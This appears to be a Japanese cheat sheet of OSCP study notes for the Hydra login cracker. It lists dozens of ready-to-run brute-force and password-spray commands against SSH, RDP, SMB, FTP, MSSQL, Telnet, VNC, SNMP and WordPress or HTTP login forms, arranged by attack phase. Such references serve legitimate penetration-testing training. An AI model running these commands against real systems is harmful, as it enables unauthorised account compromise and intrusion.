# hydra

## 🎯 概要
**Hydra** (THC-Hydra) は、非常に高速で並列処理能力に優れたネットワークログインクラッカーです。ペネトレーションテストの各フェーズ、特に **Credential Access** や **Initial Access** において、SSH、FTP、HTTP、RDP、SMB、Telnet、データベース（MSSQL/MySQL）などの多種多様なプロトコルに対してオンラインブルートフォース攻撃やパスワードスプレー攻撃を実行するために使用されます。OSCP試験においても、手動の脆弱性発見が困難な環境において、収集したユーザーリストや辞書を用いて突破口を開くための「最終兵器」として重要な役割を担います。

---

## 🛠 代表的な用途
- **オンラインパスワードクラッキング**: ネットワーク経由で稼働しているサービスの認証を突破。
- **パスワードスプレー攻撃**: 単一のパスワード（例：`Welcome123`）を多数のユーザーに対して試行し、アカウントロックを避けつつ侵入を試みる。
- **ユーザー名の列挙**: 認証エラーメッセージの差異を利用して、有効なユーザーアカウントを特定。
- **OSCPでの利用ポイント**: SSHやRDPのパスワード解析だけでなく、WordPressなどのCMSログインフォームに対する HTTP-POST 攻撃が頻出します。

---

## 🔍 基本コマンド
```bash
# 特定のユーザーに対してパスワードリストで攻撃（SSH）
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1

# ユーザー名リストとパスワードリストを組み合わせて攻撃（FTP）
hydra -L usernames.txt -P passwords.txt ftp://10.10.10.1

# スレッド数を指定して高速化（デフォルトは16）
hydra -L users.txt -P pass.txt -t 64 ssh://10.10.10.1

# ログインに成功した時点で停止
hydra -L users.txt -P pass.txt -f ssh://10.10.10.1
```

---

## 🧪 よく使う攻撃シナリオ
- **WordPressの管理者奪取**: `http-form-post` を使用して、ログインフォームのパラメータ（`log`, `pwd`）を解析し、管理パネルへの侵入を目指します。
- **SSHリバースシェルへの足がかり**: 偵察フェーズで見つけたユーザー名に基づき、SSHの資格情報を突破して初動のシェルを取得します。
- **RDP経由での横展開**: Windows環境において、特定したドメインユーザーアカウントを用いてRDP（ポート3389）経由でサーバーへログインします。

---

## 📌 フェーズ別コマンド例  

### 🔎 OSINT（外部情報収集）
```bash
# 過去の漏洩リストから得た特定のメールアドレス（ユーザー名）に対し、共通の脆弱なパスワードを試行
hydra -l user@example.com -p 'Password123' ssh://target.com
```

---

### 🔎 Reconnaissance（技術的偵察）
```bash
# サービスのバナー情報を確認しながら、デフォルト資格情報の有無を簡易チェック
hydra -C /usr/share/wordlists/metasploit/root_userpass.txt ssh://10.10.10.1
```

---

### 🧭 Enumeration（外部サービスの詳細調査）
```bash
# SSHプロトコルに対して特定のポートを指定して接続を確認
hydra -l test -p test -s 2222 ssh://10.10.10.1

# Telnetサービスが稼働している場合、匿名ログインを試行
hydra -l root -p "" telnet://10.10.10.1
```

---

### 🚪 Initial Access（初期侵入）
```bash
# WordPressのログインフォームを対象にユーザー名とパスワードを解析
hydra -L users.txt -P cewl_wordlist.txt $IP http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:S=Location'

# 独自実装のPHPフォームに対して「エラーメッセージ」を指定して攻撃
hydra -l admin -P custom_pass.txt $IP http-post-form "/index.php:key=^PASS^:invalid key"

# FTPサーバーに対して匿名ログインを拒否された後、共通ユーザーでブルートフォース
hydra -L users.txt -P /usr/share/wordlists/dirb/common.txt ftp://10.10.10.1
```

---

### 📋 Local Enumeration（侵入後のローカル調査）
```bash
# ローカルでリッスンしている内部向けMySQLサービス（3306）に対し、他のユーザーのパスワードを試行（ポートフォワード経由）
hydra -L users.txt -P rockyou.txt mysql://127.0.0.1
```

---

### 📈 Privilege Escalation（権限昇格）
```bash
# sudoコマンドでパスワードが要求されるユーザーに対し、既に判明しているパスワード候補を再試行
hydra -l localuser -P identified_passes.txt ssh://localhost
```

---

### 🔑 Credential Access（認証情報探索）
```bash
# SSH秘密鍵のパスフレーズを解析するために、SSHサービスに対して総当たりを実行
hydra -l george -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4

# HTTP基本認証（Basic Auth）を要求する管理ディレクトリを攻撃
hydra -L users.txt -P pass.txt $IP http-get /admin/
```

---

### 🏢 Active Directory（AD）
```bash
# RDPサービスに対して、ドメインユーザーのパスワードスプレーを実行
hydra -L names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

# SMB共有に対して管理者権限アカウントでのアクセスを試行
hydra -l Administrator -P pass.txt smb://10.10.10.10

# MSSQLデータベースに対してSAアカウントでのログインを試行
hydra -l sa -P passwords.txt mssql://10.10.10.10
```

---

### 🚪 Pivot / Port Forward（内部サービスへのアクセス）
```bash
# 踏み台経由で転送されたポート（例：4455）を介して内部SMB共有を攻撃
hydra -L domain_users.txt -p 'Nexus123!' -s 4455 smb://127.0.0.1
```

---

### 🚀 Lateral Movement（横展開）
```bash
# 奪取したユーザー名のリストを用い、同一ネットワーク内の他端末にSSHでログインを試行
hydra -L users.txt -P common_passwords.txt ssh://10.10.10.11 -t 4
```

---

## 🧰 便利オプション一覧
- `-l <user>`：単一のユーザー名を指定。
- `-L <file>`：ユーザー名リストファイルを指定。
- `-p <pass>`：単一のパスワードを指定。
- `-P <file>`：パスワードリストファイルを指定。
- `-C <file>`：`user:pass` 形式のリストファイルを指定。
- `-t <tasks>`：並列実行するタスク（スレッド）数。デフォルトは16。
- `-s <port>`：プロトコルのデフォルト以外のポート番号を指定。
- `-f`：最初の1つが当たったら即座に停止。
- `-v / -V`：詳細表示。`-V` は試行している全組み合わせを表示。
- `-w <secs>`：タイムアウト時間。ネットワークが遅い場合に調整。
- `-o <file>`：結果をファイルに保存。

---

## 🚀 実践例（10個以上）

```bash
# 【1】SSH: 判明している特定ユーザーへのパスワードリスト攻撃
hydra -l eve -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.214

# 【2】RDP: 多数のユーザーに対するパスワードスプレー攻撃
hydra -L users.txt -p 'Welcome2023!' rdp://192.168.50.202

# 【3】WordPress: ログイン成功時のリダイレクト（Locationヘッダー）を検知して停止
hydra -L users.txt -P passwords.txt $IP http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:S=Location'

# 【4】FTP: ユーザー名リストとパスワードリストの全組み合わせ試行
hydra -L users.txt -P pass.txt ftp://192.168.50.10

# 【5】HTTP-GET: Basic認証で保護された /admin ディレクトリの解析
hydra -L usernames.txt -P passwords.txt $IP http-get /admin/

# 【6】SMB: ローカル管理者のパスワード特定（OSCP頻出）
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.50.15

# 【7】Telnet: ネットワーク機器などのレガシーな認証の突破
hydra -l admin -P common_pass.txt telnet://192.168.50.1

# 【8】VNC: パスワードのみ（ユーザー名なし）のサービスへの攻撃
hydra -P vnc_passes.txt vnc://192.168.50.30

# 【9】MSSQL: データベース管理者アカウントのブルートフォース
hydra -l sa -P rockyou.txt mssql://192.168.50.40

# 【10】SSH: 非標準ポートで動作しているサービスへの攻撃
hydra -l root -P pass.txt -s 2222 ssh://192.168.50.50

# 【11】SNMP: コミュニティ名のブルートフォース（snmp:// 形式）
hydra -P /usr/share/wordlists/metasploit/snmp_default_pass.txt snmp://192.168.50.60

# 【12】PHPカスタムフォーム: ログイン失敗時の文字列「Invalid」を判定基準にする
hydra -L users.txt -P pass.txt $IP http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
```

---

## 🧩 他ツールとの組み合わせ
- **CeWL** → ターゲットWebサイトから単語を抽出し、そのサイト専用の強力なパスワード辞書を生成してHydraに渡します。
- **nmap** → Nmapで見つかったポートとサービス情報を元に、Hydraで攻撃するプロトコルを決定します。
- **John the Ripper / Hashcat** → 侵入後に奪取したハッシュ（オフライン）を解析し、その結果（平文）を別のホストに対するHydraのパスワードスプレー（オンライン）に使用します。
- **Netexec** → 大規模ネットワークにおける資格情報の有効性を高速に確認し、特定の重要サービスへの深掘りをHydraで行います。

---

## 📝 注意点（OSCP 試験での使い方）
- **アカウントロックのアラート**: 大量の試行（特にドメイン環境）はアカウントロックを引き起こし、試験環境での攻略が不可能になる恐れがあります。まずは手動で1,2回試し、ロックポリシーを確認してください。
- **スレッド数の調整**: `-t 64` などの極端に高い数値は、ターゲットサービスをクラッシュさせたり（DoS）、パケットをドロップさせて誤検知（False Negative）を招く原因になります。通常は `-t 4` や `-t 16` 程度から調整します。
- **証跡の保存**: 解析に成功した際、`1 valid password found` という行を含む画面のスクリーンショットを必ず保存してください。
- **辞書の展開**: `/usr/share/wordlists/rockyou.txt.gz` など、Kali標準の辞書は圧縮されている場合があるため、使用前に `gzip -d` で展開しておく必要があります。

---

## 🔗 参考リンク
- 公式：[THC-Hydra GitHub Repository](https://github.com/vanhauser-thc/thc-hydra)
- 良質解説：[Hydra Usage Examples (HackTricks)](https://book.hacktricks.xyz/brute-force)
